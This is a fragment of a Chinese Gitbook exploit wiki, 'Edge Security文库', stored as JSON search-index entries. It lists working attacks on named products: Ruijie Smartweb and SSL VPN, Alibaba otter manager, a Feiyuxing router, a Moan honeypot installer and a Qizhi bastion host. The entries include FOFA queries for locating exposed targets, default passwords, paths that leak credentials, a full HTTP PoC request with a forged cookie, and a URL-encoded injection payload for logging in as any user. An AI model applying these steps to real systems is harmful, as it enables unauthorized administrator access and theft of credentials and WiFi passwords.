https://127.0.0.1/get_dkey.php?user=admin ref： https://forum.ywhack.com/thread-114977-1-2.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/锐捷Smartweb管理系统 密码信息泄露 CNVD-2021-17369.html":{"url":"Edge_Security/锐捷Smartweb管理系统 密码信息泄露 CNVD-2021-17369.html","title":"锐捷Smartweb管理系统 密码信息泄露 CNVD-2021-17369","keywords":"","body":"锐捷Smartweb管理系统 密码信息泄露 CNVD-2021-17369 锐捷网络股份有限公司无线smartweb管理系统存在逻辑缺陷漏洞，攻击者可从漏洞获取到管理员账号密码，从而以管理员权限登录。 FOFA: title=\"无线smartWeb--登录页面\" 默认guest账户密码：guest/guest 登录后访问：http://target/web/xml/webuser-auth.xml 获取所有用户账号密码，base64解码即可。 ref： https://mp.weixin.qq.com/s/EICYTqRWDRB8OfXKHxCBfQ https://www.cnvd.org.cn/flaw/show/CNVD-2021-17369 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/锐捷SSL VPN 越权访问漏洞.html":{"url":"Edge_Security/锐捷SSL VPN 越权访问漏洞.html","title":"锐捷SSL VPN 越权访问漏洞","keywords":"","body":"锐捷SSL VPN 越权访问漏洞 Ruijie SSL VPN 存在越权访问漏洞，攻击者在已知用户名的情况下，可以对账号进行修改密码和绑定手机的操作。并在未授权的情况下查看服务器资源 FOFA: icon_hash=\"884334722\" || title=\"Ruijie SSL VPN\" 构造URL： https://1.1.1.1/cgi-bin/main.cgi?oper=showsvr&encode=GBK&username=USERNAME&sid=1614345312&oper=showres USERNAME为已存在的用户名，访问后即可进入到主页，在个人设置可以直接给这个用户绑定SSO账号及手机号。 PoC: GET /cgi-bin/main.cgi?oper=getrsc HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: UserName=xm; SessionId=1; FirstVist=1; Skin=1; tunnel=1 信息泄漏： 构造URL： https://1.1.1.1/cgi-bin/main.cgi?oper=getrsc 注：需要先使用第一步的方式构造URL进入到设置页面，否则没有Cookie，会提示“错误：当前用户不在线,请重新登录”，当然你也可以手动构造Cookie Cookie: UserName=USERNAME; SessionId=1614345312; FirstVist=1; Skin=1; tunnel=1 ref: https://mp.weixin.qq.com/s/iRmDQJH23FJ6mL_GzXeL6g https://mp.weixin.qq.com/s/WElrjPnCNNA79COFtPX0vQ Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/阿里巴巴otter manager分布式数据库同步系统信息泄漏-默认口令（CNVD-2021-16592）.html":{"url":"Edge_Security/阿里巴巴otter manager分布式数据库同步系统信息泄漏-默认口令（CNVD-2021-16592）.html","title":"阿里巴巴otter manager分布式数据库同步系统信息泄漏-默认口令（CNVD-2021-16592）","keywords":"","body":"阿里巴巴otter manager分布式数据库同步系统信息泄漏/默认口令（CNVD-2021-16592） 阿里巴巴otter manager分布式数据库同步系统是基于数据库增量日志解析，准实时同步到本机房或异地机房的mysql/oracle数据库，一个分布式数据库同步系统。阿里巴巴otter manager分布式数据库同步系统存在信息泄露漏洞，攻击者可利用漏洞获取zookper信息。 FOFA： title=\"Otter Manager\" 默认口令：admin/admin 进入后直接f12查看元素，修改password为text即可查看数据库等敏感信息密码。 ref： https://www.cnvd.org.cn/flaw/show/CNVD-2021-16592 https://forum.ywhack.com/thread-115309-1-8.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/飞鱼星 家用智能路由 cookie.cgi 权限绕过.html":{"url":"Edge_Security/飞鱼星 家用智能路由 cookie.cgi 权限绕过.html","title":"飞鱼星 家用智能路由 cookie.cgi 权限绕过","keywords":"","body":"飞鱼星 家用智能路由 cookie.cgi 权限绕过 飞鱼星家用智能路由存在权限绕过，通过Drop特定的请求包访问未授权的管理员页面。 fofa:title=\"飞鱼星家用智能路由\" http://xxx.xxx.xxx.xxx/index.html 访问 index.html 时会请求 cookie.cgi 页面抓包 Drop掉 cookie.cgi /request_para.cgi?parameter=wifi_info #获取ALL WIFI账号密码 /request_para.cgi?parameter=wifi_get_5g_host #获取5GWIFI账号密码 /request_para.cgi?parameter=wifi_get_2g_host #获取2GWIFI账号密码 ref: https://mp.weixin.qq.com/s/ARCZIR2C40KSu8SjLMYHSw https://forum.ywhack.com/thread-115486-1-5.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/默安幻阵蜜罐安装平台未授权访问.html":{"url":"Edge_Security/默安幻阵蜜罐安装平台未授权访问.html","title":"默安幻阵蜜罐安装平台未授权访问","keywords":"","body":"默安幻阵蜜罐安装平台未授权访问 fofa：body=\"幻阵安装系统\" PoC: 1、进入幻阵安装系统,刷新并抓包 2、 drop掉 /huanzhen/have_installed drop掉 /huanzhen/mode?timestamp drop掉 /huanzhen/version_info 3、进入页面，点击调试工具并放包 4、可执行ping命令 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/齐治堡垒机任意用户登陆.html":{"url":"Edge_Security/齐治堡垒机任意用户登陆.html","title":"齐治堡垒机任意用户登陆","keywords":"","body":"齐治堡垒机任意用户登陆 齐治堡垒机存在任意用户登录漏洞，通过构造URL可绕过访问控制获取目标管理员权限。 情报可以见：https://forum.ywhack.com/thread-115423-1-1.html PoC： http://xxx.xxx.xxx.xxx/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm 状态码返回200，存在漏洞；“错误ID”提示，不存在漏洞。 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "}}